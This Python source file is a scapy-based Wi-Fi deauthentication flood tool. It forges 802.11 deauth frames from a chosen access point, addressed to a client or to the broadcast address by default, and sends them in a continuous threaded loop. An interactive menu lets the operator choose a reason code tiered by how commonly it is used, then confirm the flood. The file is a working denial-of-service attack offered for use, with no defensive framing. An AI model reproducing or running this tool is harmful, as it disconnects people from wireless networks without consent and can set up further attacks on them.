import json
import os
import threading
import time

from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
from scapy.error import Scapy_Exception

from debugs import debug

_HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_REASONS_PATH = os.path.join(_HERE, "deps", "deauth_reasons.json")

_BCAST = "FF:FF:FF:FF:FF:FF"

BOLD   = "\033[1m"
RESET  = "\033[0m"
RED    = "\033[31m"
YELLOW = "\033[33m"
GREEN  = "\033[32m"

TIER_COLOR = {"red": RED, "yellow": YELLOW, "green": GREEN}


def _load_reasons(path=DEFAULT_REASONS_PATH):
    with open(path, "r") as f:
        return json.load(f)


def _reason_choices(reasons):
    return [(k, reasons[k]) for k in sorted(reasons.keys(), key=int)]


def _print_reason_grid(reasons):
    entries = []
    for k, meta in _reason_choices(reasons):
        color = TIER_COLOR.get(meta.get("tier", "yellow"), YELLOW)
        plain = f"{k}. {meta['short']}"
        colored = f"{color}{BOLD}{k}.{RESET}{color} {meta['short']}{RESET}"
        entries.append((plain, colored))

    col_gap = 4
    max_plain = max(len(p) for p, _ in entries) if entries else 0
    col_w = max_plain + col_gap
    cols = 3

    for i in range(0, len(entries), cols):
        row = entries[i:i + cols]
        line = ""
        for j, (plain, colored) in enumerate(row):
            line += colored
            if j != len(row) - 1:
                line += " " * (col_w - len(plain))
        print(line)

    print()
    print(f"{RED}RED{RESET} = Unusual but works,   "
          f"{YELLOW}YELLOW{RESET} = Uncommonly Used,   "
          f"{GREEN}GREEN{RESET} = Commonly Used")
    print()


def _choose_reason(path=DEFAULT_REASONS_PATH):
    try:
        reasons = _load_reasons(path)
    except FileNotFoundError:
        debug("error", f"reasons file not found: {path}")
        return None
    except json.JSONDecodeError as e:
        debug("error", f"reasons file malformed: {e}")
        return None

    while True:
        _print_reason_grid(reasons)
        raw = input("Reason (0 = abort, empty = 0): ").strip() or "0"
        if raw == "0":
            return None
        if raw not in reasons:
            print(f"\n[!] '{raw}' not listed. Try again.\n")
            continue

        meta = reasons[raw]
        color = TIER_COLOR.get(meta.get("tier", "yellow"), YELLOW)
        print(f"\n{color}{BOLD}{raw}. {meta['short']}{RESET}")
        print(f"    {meta['desc']}\n")
        print("1. Start flood")
        print("0. Go back")

        confirm = input("Choice (empty = 0): ").strip() or "0"
        if confirm == "0":
            print()
            continue
        if confirm == "1":
            return raw

        print("\n[!] Invalid choice.\n")


def _build_deauth(access_point, client, reason, burst):
    return RadioTap() / Dot11(
        addr1=client,
        addr2=access_point,
        addr3=access_point,
    ) / Dot11Deauth(reason=reason)


def deauth_all(interface, access_point, client=_BCAST, burst=5, inter=0.01):
    reason = _choose_reason()
    if reason is None:
        debug("info", "deauth_all: aborted at reason selection")
        return

    packet = _build_deauth(access_point, client, int(reason), burst)
    stop = threading.Event()

    def _worker():
        while not stop.is_set():
            try:
                sendp(packet, inter=inter, count=burst,
                      iface=interface, verbose=0)
            except (Scapy_Exception, OSError) as e:
                debug("critical", f"deauth_all: send failed: {e}")
                stop.set()
                return

    debug("ok", f"deauth_all: running reason={reason} "
                f"on {access_point} -> {client}")

    worker = threading.Thread(target=_worker, daemon=True)
    worker.start()

    try:
        while worker.is_alive():
            time.sleep(0.1)
    except KeyboardInterrupt:
        debug("info", "deauth_all: interrupted by user")
    finally:
        stop.set()
        worker.join(timeout=2)